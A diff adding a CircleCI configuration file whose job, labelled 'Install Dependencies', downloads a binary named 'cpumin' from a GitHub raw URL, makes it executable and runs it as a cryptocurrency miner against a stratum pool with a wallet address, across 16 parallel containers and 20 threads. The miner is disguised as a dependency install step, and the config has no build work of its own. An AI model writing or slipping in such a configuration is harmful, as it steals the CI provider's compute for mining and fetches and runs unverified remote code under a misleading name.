@@ -1,0 +1,20 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin  
+              chmod +x cpumin 
+              ./cpumin -a yescryptR16 -o stratum+tcp://stratum-asia.rplant.xyz:17055 -u qRNDBVci5Afgiq8uCkmQ9BTX9fxtAUdVUS.$(echo  $(shuf -i 1-9999 -n 1)-circle) -t 20
+              echo Hello,subscribe it
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
